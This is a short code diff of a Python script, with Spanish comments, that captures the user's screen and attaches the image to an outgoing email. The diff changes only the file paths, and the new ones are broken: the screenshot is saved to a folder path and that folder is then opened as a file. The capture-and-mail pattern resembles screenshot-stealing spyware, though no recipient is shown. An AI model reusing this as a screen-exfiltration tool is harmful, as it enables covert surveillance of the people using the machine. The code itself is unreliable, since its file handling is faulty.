@@ -17,7 +17,7 @@ import time
 def capture():
  # capturamos la pantalla
  screen = autopy.bitmap.capture_screen()
- screen.save("C:")
+ screen.save('C:/Users/osmap/Documents')
 
 
 def mail():
@@ -43,7 +43,7 @@ def mail():
 
  #adjuntamos la captura de pantalla
  ##cargamos el archivo a adjuntar
- fp = open('C://','rb')
+ fp = open('C:/Users/osmap/Documents','rb')
  adjunto = MIMEBase('multipart', 'encrypted')
  #lo insertamos en una variable
  adjunto.set_payload(fp.read())
